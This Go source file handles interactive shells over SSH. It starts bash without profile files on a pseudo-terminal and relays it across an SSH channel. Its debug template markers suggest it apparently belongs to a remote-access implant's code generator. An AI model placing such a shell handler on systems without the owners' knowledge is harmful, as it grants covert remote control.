//go:build !windows
// +build !windows

package sshd

import (
	"fmt"
	"io"

	// {{if .Debug}}
	"log"
	// {{end}}
	"os"
	"os/exec"

	"github.com/creack/pty"
	"golang.org/x/crypto/ssh"
)

func handleShell(channel ssh.Channel) {
	defer channel.Close()

	var shell *exec.Cmd
	if _, err := os.Stat("/bin/bash"); err == nil {
		shell = exec.Command("/bin/bash", "--noprofile", "--norc")
	} else {
		shell = exec.Command("/bin/sh")
	}

	if shell == nil {
		// {{if .Debug}}
		log.Printf("Shell binary not found")
		// {{end}}
		fmt.Fprintf(channel, "Shell binary not found\n")
		return
	}

	ptyFile, err := pty.Start(shell)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to start shell: %v", err)
		// {{end}}
		fmt.Fprintf(channel, "Failed to start shell: %v\n", err)
		return
	}
	defer ptyFile.Close()

	go io.Copy(ptyFile, channel)
	go io.Copy(channel, ptyFile)

	if err := shell.Wait(); err != nil {
		// {{if .Debug}}
		log.Printf("Shell exited with error: %v", err)
		// {{end}}
	}
}
